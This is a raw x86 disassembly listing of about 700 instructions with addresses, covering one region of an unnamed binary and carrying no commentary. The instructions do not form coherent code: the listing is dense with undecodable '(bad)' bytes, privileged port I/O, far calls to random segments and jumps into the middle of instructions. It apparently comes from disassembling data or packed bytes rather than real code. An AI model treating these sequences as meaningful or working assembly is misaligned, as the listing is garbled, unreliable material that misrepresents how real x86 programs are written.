  412149:	dec    BYTE PTR [eax+0x44e59f62]
  41214f:	aas    
  412150:	ror    BYTE PTR [esi+ecx*8-0x3aa3aa81],1
  412157:	shr    DWORD PTR [ebx-0x11],0xd8
  41215b:	outs   dx,DWORD PTR ds:[esi]
  41215c:	or     eax,0x7a18298a
  412161:	ret    
  412162:	sbb    eax,DWORD PTR [ecx+0x1e46d1d4]
  412168:	dec    eax
  412169:	pop    ds
  41216a:	mov    DWORD PTR [esi+0x18],esp
  41216d:	retf   0xde39
  412170:	rol    cl,0xcd
  412173:	out    dx,al
  412174:	or     dh,dl
  412176:	call   0xe4a62ed2
  41217b:	and    eax,0xbaa16498
  412180:	ins    BYTE PTR es:[edi],dx
  412181:	mov    al,ds:0xc2fbf6aa
  412186:	cs (bad) 
  412188:	iret   
  412189:	cmp    eax,0x93298b7
  41218e:	inc    eax
  41218f:	sbb    esi,eax
  412191:	jo     0x4121b7
  412193:	js     0x412115
  412195:	ret    0x3c80
  412198:	push   ebx
  412199:	retf   0x1c5e
  41219c:	outs   dx,BYTE PTR ds:[esi]
  41219d:	pop    ds
  41219e:	sub    eax,0xea402df4
  4121a3:	inc    ecx
  4121a4:	je     0x41215b
  4121a6:	repz jnp 0x4121ec
  4121a9:	lea    eax,[edi]
  4121ab:	in     al,dx
  4121ac:	std    
  4121ad:	fidivr WORD PTR [ebx+esi*8+0x69]
  4121b1:	mov    eax,0xb3065cf2
  4121b6:	das    
  4121b7:	js     0x412231
  4121b9:	pop    es
  4121ba:	xchg   dh,cl
  4121bc:	push   esi
  4121bd:	mov    ebx,0x27e4efd3
  4121c2:	(bad)  
  4121c3:	(bad)  
  4121c4:	stc    
  4121c5:	aad    0x75
  4121c7:	std    
  4121c8:	(bad)  
  4121c9:	mov    esi,0xe129098d
  4121ce:	lahf   
  4121cf:	pop    edx
  4121d0:	lahf   
  4121d1:	retf   
  4121d2:	xchg   edx,eax
  4121d3:	push   0xc5fa4346
  4121d8:	sbb    al,0xf2
  4121da:	or     DWORD PTR [edx],ebx
  4121dc:	cmp    al,0x21
  4121de:	popf   
  4121df:	inc    ebp
  4121e0:	adc    esi,DWORD PTR [eax]
  4121e2:	das    
  4121e3:	sub    eax,0x8cd9055b
  4121e8:	push   DWORD PTR [esi+0x69e7af98]
  4121ee:	xor    edi,edx
  4121f0:	push   eax
  4121f1:	and    edx,ebp
  4121f3:	mov    eax,0x5570c8da
  4121f8:	sbb    eax,0xa1cd8d57
  4121fd:	pxor   mm1,QWORD PTR [edx-0x18e25b9c]
  412204:	jne    0x4121ad
  412206:	mov    esi,0xfb46a722
  41220b:	inc    edi
  41220c:	ins    DWORD PTR es:[edi],dx
  41220d:	push   ecx
  41220e:	cdq    
  41220f:	sub    BYTE PTR [edi+0x2c1841c0],0xa7
  412216:	sar    BYTE PTR [eax],0x83
  412219:	iret   
  41221a:	xor    dl,dl
  41221c:	xor    DWORD PTR [ecx+ecx*8-0x58b7168c],ecx
  412223:	sbb    DWORD PTR [edx-0x50],esi
  412226:	test   eax,edx
  412228:	js     0x412205
  41222a:	test   al,0x3a
  41222c:	pop    esi
  41222d:	and    bl,BYTE PTR [esi]
  41222f:	ficomp WORD PTR [eax+esi*4]
  412232:	jp     0x412226
  412234:	push   esp
  412235:	jo     0x412293
  412237:	sbb    cl,bl
  412239:	loopne 0x412286
  41223b:	repnz call 0xf9a4:0xb8398db9
  412243:	xor    esp,0xea48bcae
  412249:	pushf  
  41224a:	rcr    BYTE PTR [eax-0x18],cl
  41224d:	lods   eax,DWORD PTR ds:[esi]
  41224e:	dec    edi
  41224f:	sbb    DWORD PTR ds:0x808e5ed1,0x87934d4c
  412259:	fsub   st(2),st
  41225b:	push   ebx
  41225c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41225d:	push   es
  41225e:	loope  0x412277
  412260:	and    al,0x8c
  412262:	cmc    
  412263:	dec    ebx
  412264:	mov    ebx,0xe935ceca
  412269:	inc    edi
  41226a:	xor    dl,dl
  41226c:	jo     0x41223b
  41226e:	jge    0x412227
  412270:	test   DWORD PTR [edx+eiz*2],0x7eda52c4
  412277:	mov    edi,0x375bc99c
  41227c:	xchg   edi,eax
  41227d:	cmp    eax,0x16812295
  412282:	popf   
  412283:	ret    0x93d0
  412286:	jnp    0x4122bf
  412288:	xchg   esi,eax
  412289:	rcl    edi,0xe5
  41228c:	inc    eax
  41228d:	mov    al,0x81
  41228f:	jns    0x412229
  412291:	dec    esp
  412292:	out    0x20,al
  412294:	lods   eax,DWORD PTR ds:[esi]
  412295:	lods   eax,DWORD PTR ds:[esi]
  412296:	add    eax,0xa1838781
  41229b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41229c:	jb     0x412317
  41229e:	adc    edi,DWORD PTR [ebp-0x68b34f15]
  4122a4:	mov    bl,0x7e
  4122a6:	adc    edx,ebp
  4122a8:	out    0x18,eax
  4122aa:	addr16 out dx,eax
  4122ac:	test   DWORD PTR [esi+ebp*8-0x75],0xd9644e6b
  4122b4:	lock mov al,0x82
  4122b7:	pop    ss
  4122b8:	fdiv   QWORD PTR [edi+esi*2-0x7b]
  4122bc:	pop    esp
  4122bd:	lahf   
  4122be:	mov    cl,0xb3
  4122c0:	shl    BYTE PTR [ecx-0x1e13a54c],1
  4122c6:	xchg   edx,eax
  4122c7:	mov    ds:0xafacb4ba,eax
  4122cc:	stos   DWORD PTR es:[edi],eax
  4122cd:	aas    
  4122ce:	xor    BYTE PTR [eax],bh
  4122d0:	loopne 0x4122f8
  4122d2:	test   BYTE PTR [ecx+0x11],0xaf
  4122d6:	fsubr  DWORD PTR [ebp-0x47f65849]
  4122dc:	imul   ebp,DWORD PTR [eax],0xffffffa1
  4122df:	fdivr  DWORD PTR [ecx+0x550f9e70]
  4122e5:	cmp    esi,DWORD PTR [edx]
  4122e7:	icebp  
  4122e8:	push   eax
  4122e9:	retf   
  4122ea:	test   DWORD PTR [ebx+0x28],eax
  4122ed:	sbb    edx,DWORD PTR [edx]
  4122ef:	sbb    cl,BYTE PTR [edx-0x3893b4ae]
  4122f5:	mov    cl,0xe9
  4122f7:	add    ch,dl
  4122f9:	gs (bad) 
  4122fd:	aam    0xca
  4122ff:	jge    0x412308
  412301:	mov    edi,0x8db21360
  412306:	inc    ecx
  412307:	(bad)  
  412308:	stc    
  412309:	in     eax,dx
  41230a:	inc    ebx
  41230b:	shl    BYTE PTR [edi*1-0x3dea86e],0xa2
  412313:	rcl    BYTE PTR [ecx],1
  412315:	fs dec eax
  412317:	shl    BYTE PTR [ecx+0x6499b1e5],cl
  41231d:	scas   al,BYTE PTR es:[edi]
  41231e:	push   edi
  41231f:	sub    DWORD PTR [edi-0x4526461b],ebp
  412325:	mov    edx,0x88848df6
  41232a:	mov    esi,0x35f48949
  41232f:	pop    esi
  412330:	aaa    
  412331:	xchg   DWORD PTR [esi+0x7ca81c88],esi
  412337:	pop    ecx
  412338:	push   0xffffffc3
  41233a:	mov    dh,BYTE PTR [edx]
  41233c:	jne    0x41235b
  41233e:	retf   0x52b5
  412341:	sahf   
  412342:	xchg   esi,eax
  412343:	sbb    eax,0x1d055200
  412348:	pusha  
  412349:	pop    es
  41234a:	pop    ebp
  41234b:	and    eax,0xb4ba0725
  412350:	outs   dx,BYTE PTR ds:[esi]
  412351:	sub    al,0x32
  412353:	jo     0x412303
  412355:	mov    dh,0xff
  412357:	mov    ds:0x57baae9d,eax
  41235c:	ss je  0x41230b
  41235f:	sbb    eax,0x8056bb0f
  412364:	hlt    
  412365:	adc    eax,0x32a866aa
  41236a:	idiv   DWORD PTR [edx]
  41236c:	jl     0x4123e6
  41236e:	aaa    
  41236f:	in     al,dx
  412370:	imul   ebx,DWORD PTR [ebx+0x50fc07b],0xffffffe1
  412377:	fs dec esp
  412379:	jb     0x412317
  41237b:	pop    ebx
  41237c:	sub    eax,0x80f10a16
  412381:	xchg   edx,ebp
  412383:	jne    0x4123f2
  412385:	icebp  
  412386:	outs   dx,DWORD PTR ds:[esi]
  412387:	jne    0x412350
  412389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41238a:	inc    ebx
  41238b:	icebp  
  41238c:	addr16 xchg ecx,eax
  41238e:	(bad)  
  41238f:	in     eax,0x6d
  412391:	jns    0x412332
  412393:	sub    bl,dh
  412395:	retf   
  412396:	test   eax,0xa9bc35a3
  41239b:	(bad)  
  41239c:	pop    ecx
  41239d:	push   0xffffff9f
  41239f:	jae    0x412394
  4123a1:	dec    BYTE PTR [eax+0x3b7890a1]
  4123a7:	xchg   esi,eax
  4123a8:	enter  0x5431,0xb9
  4123ac:	out    dx,eax
  4123ad:	call   0x25df:0x20c7b8f9
  4123b4:	loope  0x41234c
  4123b6:	add    cl,bl
  4123b8:	xchg   esp,eax
  4123b9:	outs   dx,DWORD PTR ds:[esi]
  4123ba:	jnp    0x41238c
  4123bc:	cs (bad) 
  4123be:	loopne 0x41238b
  4123c0:	stc    
  4123c1:	dec    eax
  4123c2:	inc    esp
  4123c3:	jo     0x412372
  4123c5:	dec    ecx
  4123c6:	inc    esi
  4123c7:	out    0x86,eax
  4123c9:	ds cdq 
  4123cb:	xchg   ecx,eax
  4123cc:	jmp    0xdf55d412
  4123d1:	rol    edx,0x1c
  4123d4:	inc    ebp
  4123d5:	sbb    DWORD PTR ds:0x354cf595,0xb1b6ed8a
  4123df:	imul   edx,edx,0x11
  4123e2:	(bad)  [ebx]
  4123e4:	in     al,dx
  4123e5:	push   eax
  4123e6:	jp     0x4123fb
  4123e8:	adc    cl,BYTE PTR [bx+di]
  4123eb:	in     eax,0x8
  4123ed:	adc    eax,0xe8ec0b90
  4123f2:	imul   edi,DWORD PTR [ebx+eax*2],0xffffffda
  4123f6:	mov    edi,0x73077bd8
  4123fb:	sbb    al,0xac
  4123fd:	sbb    eax,0xbe762359
  412402:	jnp    0x412430
  412404:	clc    
  412405:	outs   dx,BYTE PTR ds:[esi]
  412406:	dec    esp
  412407:	xchg   edi,eax
  412408:	pop    ds
  412409:	and    dl,BYTE PTR [edx]
  41240b:	add    BYTE PTR [ebp-0x5a],bh
  41240e:	adc    BYTE PTR [eax-0x4b8847b0],al
  412414:	aas    
  412415:	jns    0x412442
  412417:	xchg   esp,eax
  412418:	aaa    
  412419:	or     DWORD PTR [eax],0x5a386944
  41241f:	xor    dl,bl
  412421:	call   0x705b:0xcc877721
  412428:	cmp    BYTE PTR [ebx-0x71],ch
  41242b:	and    eax,esi
  41242d:	(bad)  
  41242e:	cmp    eax,DWORD PTR [esi-0x2fd142dd]
  412434:	xchg   esi,eax
  412435:	cs stc 
  412437:	scas   eax,DWORD PTR es:[edi]
  412438:	xlat   BYTE PTR ds:[ebx]
  412439:	stos   DWORD PTR es:[edi],eax
  41243a:	or     BYTE PTR [eax],cl
  41243c:	and    ah,BYTE PTR [esp+eiz*2]
  41243f:	(bad)  
  412440:	cmc    
  412441:	pop    ss
  412442:	in     eax,0x87
  412444:	daa    
  412445:	cmp    DWORD PTR [eax-0x5f3a4f99],ebp
  41244b:	mov    bl,0xb4
  41244d:	mov    ds:0x413d0ecd,eax
  412452:	xor    edx,eax
  412454:	or     al,0xb
  412457:	xchg   ecx,eax
  412458:	addr16 push ss
  41245a:	fst    DWORD PTR [esi-0x64]
  41245d:	ds push 0x4d7c33bb
  412463:	shl    esi,cl
  412465:	and    al,BYTE PTR [ebp+0x16d477d8]
  41246b:	into   
  41246c:	fwait
  41246d:	pop    es
  41246e:	outs   dx,DWORD PTR ds:[esi]
  41246f:	jle    0x41245a
  412471:	mov    dl,ah
  412473:	not    ebx
  412475:	data16 test BYTE PTR [esp+esi*2+0x73],cl
  41247a:	aaa    
  41247b:	sti    
  41247c:	sbb    eax,0xfb4a46d9
  412481:	and    esi,DWORD PTR [edx]
  412483:	mov    al,0xf1
  412485:	add    al,0xfb
  412487:	mov    al,0x12
  412489:	fst    DWORD PTR [eax]
  41248b:	je     0x41247d
  41248d:	fcom   QWORD PTR [esi+0x12be73ca]
  412493:	mov    es,WORD PTR [edi-0x3d]
  412496:	xchg   DWORD PTR ds:0x4d3178b9,eax
  41249c:	test   al,0x43
  41249e:	fmul   DWORD PTR [eax+0x3c]
  4124a1:	ror    cl,1
  4124a3:	mov    dh,0x2
  4124a5:	or     ebp,DWORD PTR [ecx-0x1]
  4124a8:	repz lock jne 0x41251d
  4124ac:	mov    ds:0xb5b8cc78,eax
  4124b1:	lea    esp,ds:0x147fd307
  4124b7:	xchg   ecx,eax
  4124b8:	push   edi
  4124b9:	in     eax,dx
  4124ba:	test   eax,0x7f0f577e
  4124bf:	xchg   ebx,eax
  4124c0:	rcl    BYTE PTR [edx+0x2a],cl
  4124c3:	jmp    0xb69ca3d3
  4124c8:	push   cs
  4124c9:	mov    esp,0xc36e3fc0
  4124ce:	mov    eax,ds:0xe6b48711
  4124d3:	cmc    
  4124d4:	dec    edi
  4124d5:	inc    ecx
  4124d6:	xchg   ecx,eax
  4124d7:	mov    WORD PTR [esp+ebp*8-0x1],?
  4124db:	xchg   esi,eax
  4124dc:	jno    0x4124ef
  4124de:	xchg   DWORD PTR [ecx-0x1dac2c74],ecx
  4124e4:	sub    dh,dl
  4124e6:	jp     0x412488
  4124e8:	(bad)  
  4124e9:	push   edx
  4124ea:	test   eax,0xd01729d2
  4124ef:	adc    eax,0x900d37c0
  4124f4:	cmp    dl,BYTE PTR [esi+0x0]
  4124f7:	nop
  4124f8:	lds    ebx,FWORD PTR [edx-0x33]
  4124fb:	retf   
  4124fc:	inc    edi
  4124fd:	cs add al,0x74
  412500:	inc    ebx
  412501:	in     eax,0x4d
  412503:	imul   DWORD PTR [edx-0x79]
  412506:	es aaa 
  412508:	mov    dl,0x72
  41250a:	rcl    DWORD PTR [edx],0xee
  41250d:	shr    BYTE PTR [ebx+0x5a],cl
  412510:	lahf   
  412511:	jmp    0x412510
  412513:	mov    bh,0x1d
  412515:	jecxz  0x4124c0
  412517:	mov    ebp,DWORD PTR [eax-0x47]
  41251a:	int3   
  41251b:	dec    ebp
  41251c:	imul   edi,DWORD PTR [ebx],0xffffff9c
  41251f:	rcr    esi,0xd3
  412522:	mov    ch,0x6d
  412524:	push   edx
  412525:	push   edi
  412526:	sub    bh,BYTE PTR [ebx-0x55286eee]
  41252c:	pop    edi
  41252d:	fimul  DWORD PTR [edx-0x34]
  412530:	cmc    
  412531:	xor    DWORD PTR [edx+0x70ef52],esp
  412537:	cmp    al,0xef
  412539:	lea    ecx,[edx+0x7dfb4c0a]
  41253f:	out    dx,al
  412540:	int    0x41
  412542:	pop    ds
  412543:	adc    ah,cl
  412545:	cli    
  412546:	aas    
  412547:	add    al,0x2c
  412549:	hlt    
  41254a:	jb     0x4125b1
  41254c:	loop   0x4124fb
  41254e:	shr    DWORD PTR [esi+0x1a03bfca],1
  412554:	and    BYTE PTR [edx],0x72
  412557:	sti    
  412558:	inc    ecx
  412559:	and    edi,ebp
  41255b:	xor    eax,0xd2e40bc5
  412560:	sub    bl,dh
  412562:	cmp    eax,0xd814589b
  412567:	hlt    
  412568:	loope  0x412573
  41256a:	and    DWORD PTR [ebx],ecx
  41256c:	test   al,0xe0
  41256e:	test   eax,0x83138018
  412573:	(bad)  
  412574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412575:	ret    0x6624
  412578:	sub    ah,ch
  41257a:	pop    ebp
  41257b:	lea    ebp,[ebx]
  41257d:	mov    eax,0xc2476dc6
  412582:	repz sbb bh,BYTE PTR [esi-0x67bdb053]
  412589:	dec    ecx
  41258a:	cmp    bh,bh
  41258c:	dec    eax
  41258d:	or     DWORD PTR [edi-0x6f],edi
  412590:	pop    es
  412591:	repnz sbb DWORD PTR [eax+0x3ffddfb3],edi
  412598:	inc    ecx
  412599:	sbb    ebp,eax
  41259b:	xchg   ebx,eax
  41259c:	arpl   WORD PTR [eax],bp
  41259e:	xor    eax,0x3abb198a
  4125a3:	mov    esp,0x3f265ca7
  4125a8:	fs nop
  4125aa:	fisttp QWORD PTR ds:0x369f4b43
  4125b0:	out    dx,al
  4125b1:	push   ebx
  4125b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b3:	dec    ecx
  4125b4:	les    edx,FWORD PTR [esi+0x75]
  4125b7:	mov    ds:0x24e25f6e,al
  4125bc:	retf   
  4125bd:	push   ebx
  4125be:	pop    esp
  4125bf:	repz cmp cl,BYTE PTR [esi]
  4125c2:	push   esi
  4125c3:	enter  0x3f85,0x60
  4125c7:	jecxz  0x4125d7
  4125c9:	ins    BYTE PTR es:[edi],dx
  4125ca:	or     DWORD PTR ds:0xa33b641a,0x998b51d3
  4125d4:	push   ebx
  4125d5:	jns    0x41257f
  4125d7:	mov    cs,WORD PTR [ebx-0x5f640b54]
  4125dd:	adc    DWORD PTR ds:0xbc86c570,edi
  4125e3:	push   0x551b441b
  4125e8:	mov    DWORD PTR [edx+0x69f53a76],eax
  4125ee:	jns    0x412609
  4125f0:	mov    ah,0xd1
  4125f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f3:	pop    edx
  4125f4:	adc    bh,dl
  4125f6:	fdivr  st,st(6)
  4125f8:	dec    DWORD PTR [edi]
  4125fa:	clc    
  4125fb:	call   0xbb5c4db4
  412600:	dec    ecx
  412601:	dec    esp
  412602:	in     eax,dx
  412603:	xchg   ebx,eax
  412604:	pop    es
  412605:	pop    edx
  412606:	jnp    0x41259b
  412608:	mov    fs,ecx
  41260a:	push   es
  41260b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260c:	sahf   
  41260d:	sahf   
  41260e:	jge    0x412609
  412610:	jnp    0x4125b6
  412612:	lahf   
  412613:	scas   al,BYTE PTR es:[edi]
  412614:	jmp    FWORD PTR cs:[ebx-0x14c82d87]
  41261b:	inc    edx
  41261c:	adc    dl,BYTE PTR [eax]
  41261e:	adc    al,0xf9
  412620:	in     al,dx
  412621:	xchg   dl,ch
  412623:	jmp    0x9a1b3959
  412628:	loopne 0x4125c0
  41262a:	pusha  
  41262b:	or     eax,0xb83a191e
  412630:	not    DWORD PTR ds:0xf55532ce
  412636:	sbb    al,0x2d
  412638:	test   al,0x4e
  41263a:	mov    edi,0xa69a731
  41263f:	push   ebx
  412640:	pop    es
  412641:	in     al,dx
  412642:	cli    
  412643:	arpl   bp,bx
  412645:	mov    cx,0xf017
  412649:	xchg   edi,eax
  41264a:	addr16 call 0x9c42c4c5
  412650:	jp     0x412688
  412652:	inc    eax
  412653:	adc    esi,ecx
  412655:	sar    BYTE PTR [ebp-0x633eeb4f],1
  41265b:	push   esp
  41265c:	cwde   
  41265d:	outs   dx,BYTE PTR ds:[esi]
  41265e:	cmp    bh,BYTE PTR [edx-0x7df102c]
  412664:	cmp    dl,bl
  412666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412667:	pop    ebx
  412668:	push   cs
  412669:	lds    eax,FWORD PTR [esi-0x54c82ee4]
  41266f:	mov    WORD PTR [ebp-0x64],cs
  412672:	ds adc eax,0xec0cd0eb
  412678:	int    0x74
  41267a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267b:	mov    dl,0xe9
  41267d:	add    ch,bh
  41267f:	sahf   
  412680:	jg     0x412634
  412682:	mov    esp,esi
  412684:	jbe    0x41263a
  412686:	push   es
  412687:	clc    
  412688:	lods   eax,DWORD PTR ds:[esi]
  412689:	cli    
  41268a:	ins    BYTE PTR es:[edi],dx
  41268b:	dec    ebx
  41268c:	and    dl,BYTE PTR fs:[eax-0x1e]
  412690:	leave  
  412691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412692:	(bad)  
  412693:	cmp    DWORD PTR [esi+0x40],eax
  412696:	mov    gs,WORD PTR [eax+0x32]
  412699:	leave  
  41269a:	xchg   DWORD PTR [esp+edi*8],edi
  41269d:	loope  0x4126f4
  41269f:	cs shl ecx,cl
  4126a2:	push   esp
  4126a3:	pop    ss
  4126a4:	jge    0x412674
  4126a6:	mov    DWORD PTR ds:0xee9b2657,0xdc288e61
  4126b0:	and    ebp,ecx
  4126b2:	pushf  
  4126b3:	imul   edx,ebp,0xd
  4126b6:	dec    edi
  4126b7:	and    BYTE PTR ds:[esi+0xf3506f5],al
  4126be:	iret   
  4126bf:	loopne 0x412669
  4126c1:	cmp    BYTE PTR [eax+0x71],cl
  4126c4:	idiv   BYTE PTR ds:0x2da70874
  4126ca:	jle    0x412702
  4126cc:	mov    WORD PTR [eax],fs
  4126ce:	jb     0x4126a5
  4126d0:	pop    esp
  4126d1:	add    eax,0x7aac8aaf
  4126d6:	pushf  
  4126d7:	ret    
  4126d8:	push   ecx
  4126d9:	test   al,0x73
  4126db:	add    DWORD PTR [edi],ebp
  4126dd:	stc    
  4126de:	jecxz  0x4126ec
  4126e0:	jb     0x412700
  4126e2:	fmul   QWORD PTR [edx+edx*4]
  4126e5:	out    dx,al
  4126e6:	xor    ecx,DWORD PTR [edx+0x3e]
  4126e9:	xchg   esi,eax
  4126ea:	lods   eax,DWORD PTR ds:[esi]
  4126eb:	inc    eax
  4126ec:	sub    DWORD PTR [esi],0xffffffb5
  4126ef:	sub    BYTE PTR [edx+eiz*1],0x3f
  4126f3:	shr    dl,1
  4126f5:	sti    
  4126f6:	push   edx
  4126f7:	mov    eax,0xcda7e6b1
  4126fc:	das    
  4126fd:	bound  edi,QWORD PTR [edx]
  4126ff:	out    0x7,eax
  412701:	ficom  WORD PTR [ebx-0x7405b7]
  412707:	and    esp,ecx
  412709:	enter  0x8b6a,0x82
  41270d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270e:	iret   
  41270f:	mov    BYTE PTR [ebx+0x68],0x17
  412713:	mov    ch,0x33
  412715:	ins    DWORD PTR es:[edi],dx
  412716:	sub    bh,BYTE PTR [eax+0x25]
  412719:	sbb    al,0xe6
  41271b:	ins    DWORD PTR es:[edi],dx
  41271c:	ret    0x21a5
  41271f:	je     0x412758
  412721:	jb     0x412726
  412723:	mov    DWORD PTR [edi],ebp
  412725:	fimul  DWORD PTR [edi]
  412727:	xlat   BYTE PTR ds:[ebx]
  412728:	addr16 lahf 
  41272a:	out    0x4,al
  41272c:	mov    cs,edi
  41272e:	xchg   ecx,eax
  41272f:	mov    dl,BYTE PTR [ecx]
  412731:	and    eax,0x823e11f6
  412736:	nop
  412737:	dec    eax
  412738:	xchg   edi,eax
  412739:	sub    edi,ebp
  41273b:	loop   0x4126c7
  41273d:	sub    BYTE PTR [eax-0x7e2a45cc],dh
  412743:	(bad)  
  412744:	inc    eax
  412745:	outs   dx,DWORD PTR ds:[esi]
  412746:	mov    ecx,0x8aff203c
  41274b:	ret    
  41274c:	xchg   ebx,eax
  41274d:	ins    BYTE PTR es:[edi],dx
  41274e:	mov    ds:0x1a8c0cdb,eax
  412753:	dec    ecx
  412754:	adc    ebp,DWORD PTR [ecx-0x3611a1a3]
  41275a:	stos   BYTE PTR es:[edi],al
  41275b:	adc    dh,cl
  41275d:	bound  esp,QWORD PTR [edi+eax*8-0x34e7c889]
  412764:	inc    edi
  412765:	mov    dl,dl
  412767:	sbb    edi,DWORD PTR [ecx+0x4f]
  41276a:	jns    0x412715
  41276c:	mov    ch,0x7f
  41276e:	mov    ah,0xd8
  412770:	test   BYTE PTR [edi],ch
  412772:	ins    BYTE PTR es:[edi],dx
  412773:	dec    esp
  412774:	or     dl,BYTE PTR [ecx+0x184178d4]
  41277a:	scas   eax,DWORD PTR es:[edi]
  41277b:	xchg   ebx,eax
  41277c:	mov    ah,0x15
  41277e:	mov    BYTE PTR [ebp+0x76],dh
  412781:	mov    dh,0x3
  412783:	out    0x65,eax
  412785:	in     eax,0x24
  412787:	sub    eax,0xd266c986
  41278c:	mov    bh,0xed
  41278e:	pushf  
  41278f:	(bad)  [eax-0x106adbf]
  412795:	int    0x2a
  412797:	ins    DWORD PTR es:[edi],dx
  412798:	push   cs
  412799:	sbb    bl,BYTE PTR [ebp+0x34]
  41279c:	cmp    bh,BYTE PTR gs:[edi+0x1ddfdaa1]
  4127a3:	adc    bh,al
  4127a5:	not    BYTE PTR ds:0xabaa
  4127aa:	inc    edx
  4127ab:	jmp    0xedb61714
  4127b0:	mov    bh,al
  4127b2:	sub    ebx,DWORD PTR [eax-0x28]
  4127b5:	adc    al,0x61
  4127b7:	ficomp WORD PTR [edx+eax*4-0x7304d468]
  4127be:	nop
  4127bf:	xchg   edx,eax
  4127c0:	adc    DWORD PTR [edx+ecx*4+0x16],ebp
  4127c4:	add    eax,0xdf370140
  4127c9:	pop    esi
  4127ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127cb:	adc    ah,BYTE PTR [eax+0x1ae548e5]
  4127d1:	jge    0x412780
  4127d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d4:	int3   
  4127d5:	mov    BYTE PTR [eax-0x2d],dl
  4127d8:	push   edx
  4127d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127da:	sar    ebp,cl
  4127dc:	out    0x63,eax
  4127de:	or     al,0x8e
  4127e0:	mov    cl,0x35
  4127e2:	(bad)  
  4127e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e4:	add    dh,0x70
  4127e7:	xor    DWORD PTR [ecx+0x746113c9],ebp
  4127ed:	push   edx
  4127ee:	popa   
  4127ef:	pop    ebp
  4127f0:	push   cs
  4127f1:	jbe    0x41284a
  4127f3:	mov    ah,0x3f
  4127f5:	retf   
  4127f6:	les    edx,FWORD PTR [edi+0x1d80afa]
  4127fc:	(bad)  
  4127fd:	out    dx,eax
  4127fe:	std    
  4127ff:	std    
  412800:	dec    ecx
  412801:	mov    edi,0x1e04ac52
  412806:	test   BYTE PTR [edi],ah
  412808:	mov    ecx,edx
  41280a:	jns    0x412806
  41280c:	jecxz  0x4127ab
  41280e:	jbe    0x412809
  412810:	pmaddwd mm3,QWORD PTR [esi+eiz*1+0x2e59481]
  412818:	fwait
  412819:	push   ebp
  41281a:	add    eax,0xb3bff52a
  41281f:	fs inc edi
  412821:	dec    edx
  412822:	xor    cl,bl
  412824:	pop    esi
  412825:	and    ebp,DWORD PTR [esp+ecx*4+0x47]
  412829:	mov    es,WORD PTR [edx]
  41282b:	ins    BYTE PTR es:[edi],dx
  41282c:	jns    0x4127b4
  41282e:	dec    eax
  41282f:	cmp    al,0xa7
  412831:	xor    al,0xdd
  412833:	out    dx,al
  412834:	ins    BYTE PTR es:[edi],dx
  412835:	push   esp
  412836:	mov    es,WORD PTR [edx+0x1d87e8d8]
  41283c:	loopne 0x4127cc
  41283e:	shr    BYTE PTR [eax],0xb0
  412841:	sub    BYTE PTR [edx],bh
  412843:	popa   
  412844:	leave  
  412845:	fsub   DWORD PTR [ebx]
  412847:	shr    DWORD PTR [eax+0x14],1
  41284a:	or     eax,0xa7701dbf
  41284f:	mov    cl,0x2a
  412851:	xchg   BYTE PTR [ecx+0x70a65704],bh
  412857:	shl    DWORD PTR [edx-0x72],0x41
  41285b:	adc    ebp,ebx
  41285d:	inc    edx
  41285e:	dec    ebx
  41285f:	dec    esp
  412860:	cmp    BYTE PTR [ebx+0x1c],dl
  412863:	sbb    al,0xf7
  412865:	sbb    eax,ecx
  412867:	adc    eax,0x4b9382a1
  41286c:	jmp    0xa516465e
  412871:	add    DWORD PTR [ebp+0xb5f46c4],ebp
  412877:	out    0x9d,eax
  412879:	jmp    0x412819
  41287b:	push   edi
  41287c:	stc    
  41287d:	ror    ebp,1
  41287f:	jnp    0x412829
  412881:	fdiv   DWORD PTR [ebp+0x386c075e]
  412887:	mov    ebx,0x4e1f0336
  41288c:	ret    0xcbcb
  41288f:	test   BYTE PTR [edi+0x1eedf5be],0x7d
  412896:	adc    DWORD PTR [esi+0xd],0x3962af69
  41289d:	cwde   
  41289e:	xchg   bh,ch
  4128a0:	rol    eax,cl
  4128a2:	out    0x94,al
  4128a4:	pop    eax
  4128a5:	ss cmp eax,0xdfd10adf
  4128ab:	push   ebx
  4128ac:	inc    ecx
  4128ad:	in     eax,0x20
  4128af:	fstp   TBYTE PTR [eax-0x599b2e59]
  4128b5:	xchg   esi,eax
  4128b6:	jno    0x4128b0
  4128b8:	fmulp  st(4),st
  4128ba:	icebp  
  4128bb:	push   edx
  4128bc:	icebp  
  4128bd:	push   esi
  4128be:	add    eax,0x9c26415e
  4128c3:	fiadd  DWORD PTR [eax]
  4128c5:	cmp    al,0x60
  4128c7:	loopne 0x4128a1
  4128c9:	(bad)  
  4128ca:	jnp    0x412853
  4128cc:	jge    0x412902
  4128ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128cf:	mov    al,0x8d
  4128d1:	(bad)  
  4128d2:	jae    0x41287c
  4128d4:	add    eax,edx
  4128d6:	test   al,0x56
  4128d8:	xchg   ebp,eax
  4128d9:	add    al,0xe
  4128db:	or     eax,0xdbe0a562
  4128e0:	push   ebp
  4128e1:	scas   eax,DWORD PTR es:[edi]
  4128e2:	adc    bl,bh
  4128e4:	add    edi,esi
  4128e6:	lock pop ss
  4128e8:	out    0xec,al
  4128ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128eb:	sub    eax,0x5e802253
  4128f0:	push   edi
  4128f1:	sub    edi,DWORD PTR [ebx-0x52f985c7]
  4128f7:	(bad)  
  4128f8:	or     BYTE PTR [esi-0x80],ch
  4128fb:	sti    
  4128fc:	pusha  
  4128fd:	rcl    edi,cl
  4128ff:	mov    BYTE PTR [ebp-0x49],ah
  412902:	stos   BYTE PTR es:[edi],al
  412903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412904:	mov    bh,BYTE PTR [ecx-0x75]
  412907:	popa   
